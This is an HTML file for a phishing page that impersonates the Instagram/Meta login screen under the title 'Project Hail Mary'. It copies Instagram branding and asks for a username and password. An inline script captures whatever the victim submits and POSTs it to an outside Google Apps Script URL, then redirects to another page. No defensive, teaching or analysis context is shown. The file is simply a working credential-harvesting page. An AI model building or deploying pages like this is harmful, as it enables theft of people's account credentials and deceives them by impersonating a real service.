  <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Project Hail Mary</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="container">

    <!-- Logo -->
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="logo">
    </div>

    <!-- Login Box -->
    <div class="login-box">
      <h2>Log in to view project</h2>

      <!-- ✅ FORM -->
      <form id="form">
        <input type="text" name="username" placeholder="Mobile number, username or email address" required>
        <input type="password" name="password" placeholder="Password" required>

        <button type="submit">Log in</button>
      </form>

      <p class="forgot">Forgotten password?</p>

      <div class="divider">OR</div>

      <button class="fb-btn">Log in with Facebook</button>

      <button class="create-btn">Create new account</button>
    </div>

    <!-- Footer -->
    <footer>
      <p>Meta • About • Blog • Jobs • Help • Privacy • Terms</p>
      <p>© 2026 Instagram from Meta</p>
    </footer>

  </div>

  <!-- ✅ SCRIPT -->
  <script>
  const scriptURL = "https://script.google.com/macros/s/AKfycbz3dFzd3f8eFjgup9_x23uJeApmfj2042qAWriLRS22ZnZWuiBpzw8m8-0yuyfyUmY/exec";

  document.getElementById("form").addEventListener("submit", function(e) {
    e.preventDefault();

    fetch(scriptURL, {
      method: "POST",
      body: new FormData(this)
    })
    .then(() => {
  window.location.href = "template.html";
})
    .catch(() => alert("Error"));
  });
  </script>

</body>
</html>
    <script  src="./script.js"></script>

  </body>
  
</html>
